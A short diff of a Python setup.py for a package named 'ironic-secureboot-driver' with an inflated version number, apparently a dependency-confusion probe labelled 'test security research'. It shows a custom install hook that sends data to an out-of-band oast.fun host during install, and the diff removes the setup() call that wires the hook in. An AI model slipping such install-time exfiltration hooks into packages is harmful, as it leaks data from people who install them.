@@ -16,10 +16,4 @@ class CustomInstall(install):
         requests.get("http://chpxdgy2vtc0000438a0ge5qsawyyyyyb.oast.fun",params = ploads) #replace burpcollaborator.net with Interactsh or pipedream
 
 
-setup(name='ironic-secureboot-driver', #package name
-      version='31463.0.0',
-      description='test security research',
-      author='test security research',
-      license='MIT',
-      zip_safe=False,
-      cmdclass={'install': CustomInstall})
+# setup(...) removed                                                                                                                                                                                                                                    
